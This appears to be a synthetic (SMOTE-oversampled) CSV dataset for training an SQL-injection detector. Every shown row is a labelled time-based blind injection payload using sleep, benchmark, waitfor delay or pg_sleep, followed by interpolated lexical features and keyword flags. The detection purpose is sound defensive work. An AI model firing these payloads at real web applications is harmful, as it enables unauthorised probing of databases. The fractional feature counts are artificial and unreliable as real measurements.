id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000398,attack,time,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000291,0.7548395734164286,92.70934380416132,25.83737521664526,3.3655450687377515,21.0,18.0,42.0,11.709343804161314,0.22651984339792103,0.1941598657696466,0.45303968679584206,0.12628060403659028,0.0,0.709343804161315,2.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,4.0,0.0,0.709343804161315,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000399,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000173,1.0656473642496715,75.70004797419664,18.0,2.859217852021361,22.9856937253443,2.0,39.37148339908186,11.342870849770465,0.3050709742045015,0.026471633089853147,0.5188829343106043,0.14957445839504097,0.0,4.0,0.0,0.0,0.0,0.0,0.0,7.342870849770466,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.6714354248852329,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.671435424885233
SMOTE_000400,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000045,0.1506549450666097,77.17394623996506,16.173946239965062,2.5551037118770306,18.173946239965062,2.0,44.0,13.0,0.2354322772983667,0.025917549922089278,0.5701860982859638,0.16846407449358022,0.0,4.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.9420179200116454,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9420179200116454
SMOTE_000401,attack,time,"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000157,1.0958271736596668,90.17506856124805,25.529178093541343,3.728020189577458,22.0,27.0,32.11671237416537,9.058356187082685,0.24424032772865442,0.29974949312153043,0.35581534046656105,0.10019483868325413,0.5291780935413424,0.0,0.0,0.0,0.0,2.0,0.0,4.529178093541343,0.0,0.0,1.0,2.0,0.5291780935413425,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000402,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""azzv"" like ""azzv",nearest_attack_euclidean,R000144,1.3714397427049596,80.7419386021015,28.258061397898498,4.066865022703201,33.96775440840601,15.0,23.516122795796996,8.258061397898498,0.42058954568014406,0.18578254953217244,0.29131811089679355,0.10230979389088987,0.774184193695496,2.225815806304504,0.0,0.0,0.0,0.2580613978984987,0.0,4.0,0.0,0.0,1.0,0.2580613978984987,0.25806139789849875,0.7419386021015013,0.0,0.0,0.0,0.2580613978984988,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000403,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000059,0.6131934246654184,62.52808484466874,19.176028281556246,3.226188971916253,26.35205656311249,1.0,27.0,8.176028281556246,0.42136409452892987,0.015997993835069793,0.4319458335468844,0.13069207808911598,0.0,3.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.17602828155624645,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8239717184437534,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8239717184437536
SMOTE_000404,attack,time,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000096,0.3617490575581798,90.54704962127218,22.132086398066164,2.9156543116234714,28.0,2.0,47.679136019338344,12.867913601933834,0.309807113607673,0.02212907954340522,0.5258554860892097,0.14220832075971207,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.735827203867668,0.13208639806616562,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000405,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000083,0.9528511651959571,65.26984755233225,27.460304895335497,4.210613775915199,25.920609790670998,12.0,15.888932866325757,11.460304895335499,0.3973318770351152,0.18386056628718253,0.2431241889460425,0.17568336773165977,4.460304895335499,0.0,2.0,0.0,0.0,1.0,0.0,1.2698475523322506,0.0,0.0,0.0,3.7301524476677494,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7301524476677496,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7301524476677494
SMOTE_000406,attack,time,"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000246,1.0080757777916494,87.50968183352174,23.0,3.0319312526973436,28.0,2.0,44.42473486126812,13.084946972253624,0.3214826640994811,0.02296304743567723,0.5061099073749329,0.14944438108990876,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.084946972253624,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000407,attack,time,"1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000202,0.8301927821562443,70.23469277331283,22.0,3.2055712106564505,13.0,10.0,33.38775421865026,13.846938554662565,0.18599461601812864,0.14307278155240666,0.47379405806051283,0.19713854436895187,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.8469385546625645,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000408,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000112,0.20771759579827012,93.09971651939752,22.0,2.8646941230759717,28.0,2.0,49.879773215518014,13.219943303879504,0.30089734843756943,0.021492667745540664,0.5356401867298497,0.14196979708704016,1.0,0.0,0.0,0.0,1.0,0.0,0.0,10.219943303879504,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000409,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf",nearest_attack_euclidean,R000060,0.2582286666584474,66.46851607989787,27.0,3.9702933225570947,23.707177450063835,15.40995156991063,20.292822549936165,7.058564509987233,0.35737701183183135,0.2313736819032829,0.3050687892501699,0.10618051701471587,0.0,0.0,2.0,0.0,0.0,0.05856450998723295,0.0,4.0,0.0,0.0,1.0,2.058564509987233,0.0,0.0,1.0,0.0,0.0,0.05856450998723306,1.0,0.0,0.0,0.9999999999999999,0.0,0.941435490012767,0.0,0.0,0.0,0.05856450998723295,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000410,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000023,0.2902909905929846,79.85279250737076,18.926396253685382,2.70451745089831,21.073603746314618,2.0,43.852792507370765,12.926396253685382,0.26393904760422815,0.025047181888663228,0.5491507260040621,0.1618630445030466,0.0,4.0,0.0,0.0,0.0,0.9263962536853819,0.0,8.0,0.0,0.0,0.0,0.9263962536853818,0.0,1.0,0.0,0.0,0.0,0.9263962536853818,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0736037463146183,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0736037463146184
SMOTE_000411,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000003,0.4812858078072,61.204021838373514,19.795978161626486,2.9484205344202925,12.693967242439733,10.0,30.408043676747024,8.102010919186757,0.20756693153525058,0.1634035341182058,0.4966874861125066,0.13234204823403697,0.0,0.0,0.0,0.0,0.0,0.10201091918675598,0.0,6.0,0.0,0.0,1.0,0.1020109191867562,0.0,0.0,0.0,1.0,0.0,0.10201091918675609,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.10201091918675598,0.897989080813244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000412,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',nearest_attack_euclidean,R000266,0.033084242766039794,85.13585145433345,22.049400528848526,3.0767392155374016,28.061750661060657,1.0123501322121307,42.037050396636396,14.024700264424263,0.32958884380745335,0.011876704630355145,0.4938043532637364,0.16473009829845517,3.012350132212131,0.0,0.0,0.0,1.0,1.0,0.0,8.0,1.0123501322121313,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000413,attack,time,1'  )   as njfg where 6392  =  6392 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000203,0.6050550069958383,60.08317212858802,28.729206967852996,4.31698622000234,24.083172128588014,12.0,14.729206967852996,9.270793032147004,0.4003212796957677,0.19989290676807744,0.24556783136252527,0.15421798217362956,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.2707930321470036,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2707930321470038,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2707930321470036
SMOTE_000414,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000284,0.08290691514157057,86.15605682982708,27.019507103728387,3.762601632069487,34.902464481358074,10.0,31.195071037283856,10.058521311185157,0.4052634780248449,0.11608602569294027,0.3619419034490069,0.11670859283320789,0.0,4.0,0.0,0.0,0.0,1.0195071037283856,0.0,4.039014207456772,0.0,0.9999999999999999,0.0,1.0195071037283856,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.9804928962716142,0.019507103728385655,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000415,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""ckht""  =  ""ckht",nearest_attack_euclidean,R000289,1.1808549687060288,74.88352483303609,24.48544060412951,3.3373970142904805,20.941762416518046,4.0,34.941762416518046,15.0,0.2774920955887273,0.05394131016030854,0.46628668114980715,0.20227991310115706,2.0,4.0,0.0,0.0,0.0,1.0,0.0,5.485440604129511,0.5145593958704883,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000416,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000236,0.054568563930533776,91.05305646005814,21.053056460058144,2.8271168114291334,28.053056460058144,2.0,49.0,12.0,0.30808726893343535,0.02196548352592269,0.5381543463851058,0.13179290115553613,0.0,0.0,0.0,0.0,1.0,0.0,0.0,10.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.9734717699709282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.973471769970928
SMOTE_000417,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000236,0.8662612402099747,91.84225699891128,21.842256998911285,2.862783466264299,28.842256998911285,2.0,49.0,12.0,0.3139622109100096,0.021778977431428273,0.5335849470699925,0.1306738645885696,0.0,0.0,0.0,0.0,1.0,0.0,0.0,10.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.5788715005443574,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.578871500544357
SMOTE_000418,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000017,0.6524490035299427,94.45206183305652,23.0,3.2043293853948454,31.753436388427534,1.8493127223144938,45.150687277685506,15.698625444628986,0.3360176687527348,0.019623960543041163,0.4780458238226469,0.16631254688157715,3.849312722314493,0.0,0.0,0.0,1.0,1.0,0.0,8.150687277685506,1.6986254446289861,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.849312722314493,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.849312722314494
SMOTE_000419,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000091,0.43314085419176207,70.8570005183101,27.785749870422475,3.830062826178806,16.0,21.0,24.857000518310105,9.0,0.22592432272336646,0.2965256735744185,0.35046757217032143,0.12708243153189364,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.214250129577526,0.7857498704224735,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000420,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000301,1.5767677391901584,63.67314639496709,22.88456907002194,3.4316445888178073,19.44228453501097,10.0,27.230861859956125,7.0,0.3056969511839549,0.15713859455343154,0.4271674380752115,0.10999701618740207,0.442284535010969,0.0,0.0,0.0,0.0,1.0,0.0,4.557715464989031,0.0,0.9999999999999999,0.0,1.0,0.44228453501096904,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.442284535010969,0.557715464989031,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000421,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000183,0.7239169194911346,94.66600183353921,28.0,3.8241756170052286,20.0,30.0,34.0,10.66600183353922,0.2112743519965527,0.316911527994829,0.3591663983941396,0.11264772161447867,0.6660018335392197,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.6660018335392198,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000422,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000172,0.19556594671347086,59.594207792761,20.14855194819025,3.4403358963208377,22.7028961036195,3.334241883428062,22.557069805713436,11.0,0.3827805855096153,0.05490116333197122,0.37735469990877984,0.18496355124963368,4.888586038857313,0.0,0.0,0.0,0.0,1.0,0.0,3.111413961142687,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000423,attack,time,"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000262,0.29993421372836454,74.71621387622776,26.88063102062871,3.67289519489763,16.0,21.0,28.716213876227748,9.0,0.2142805030372223,0.28124316023635426,0.3839435537679859,0.12053278295843756,0.8806310206287082,0.0,0.0,0.0,0.0,1.0,0.0,5.119368979371291,0.0,0.0,1.0,1.0,0.8806310206287085,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000424,attack,time,"1  )   where 5234  =  5234 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000307,0.6391718238874731,92.26454203779697,26.529084075593932,3.7088891888986293,22.0,27.0,34.0,9.264542037796966,0.23845021916414993,0.29264345079236587,0.36851397507186806,0.1003923549716162,0.0,0.2645420377969663,0.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,2.0,0.0,0.2645420377969663,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000425,attack,time,"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000225,1.189874882302629,89.49012131611086,27.644268383412737,3.5834585213366603,22.0,18.0,38.134389699523595,11.355731616587265,0.24617477757955017,0.201415727110541,0.4255377276202692,0.1268717676896396,0.3557316165872656,0.6442683834127343,2.0,0.0,0.0,2.0,0.0,5.355731616587265,0.0,0.0,1.0,4.0,0.35573161658726576,0.6442683834127343,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000426,attack,time,"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000225,0.2695129333621333,85.92048272963683,27.537349741272926,3.617343399568318,21.537349741272926,18.0,35.53734974127293,10.845783247090974,0.2502753593825751,0.20995611885790225,0.41357456293872125,0.12619395882080142,0.0,0.9228916235454876,2.0,0.0,0.0,2.0,0.0,4.922891623545487,0.0,0.0,1.0,4.0,0.0,0.9228916235454876,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000427,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",nearest_attack_euclidean,R000075,1.0078274129603524,67.90004451172395,18.38749443603451,3.0823387553160093,25.38749443603451,1.6125055639654935,31.67503338379296,9.225011127930987,0.3755893119081939,0.023404383192063963,0.4655322729377791,0.13547403196196303,0.0,3.612505563965493,0.0,0.0,0.0,0.0,0.0,5.6125055639654935,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.3874944360345068,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3874944360345065
SMOTE_000428,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000041,0.6953604864157137,84.78716599974535,23.0,3.0798537520635145,28.0,2.0,42.15597166645447,12.631194333290892,0.3316021972663122,0.023685871233308023,0.4958096682586941,0.14890226324168565,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.631194333290892,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000429,attack,time,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,0.33219530490376015,80.68161288689318,24.34080644344659,3.3984019000421517,16.88639785218447,19.227204295631058,34.454408591262116,10.113602147815529,0.20949482690371712,0.23825954924411546,0.4269153850503781,0.12533023880178934,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.113602147815529,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.11360214781552935,0.8863978521844709,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
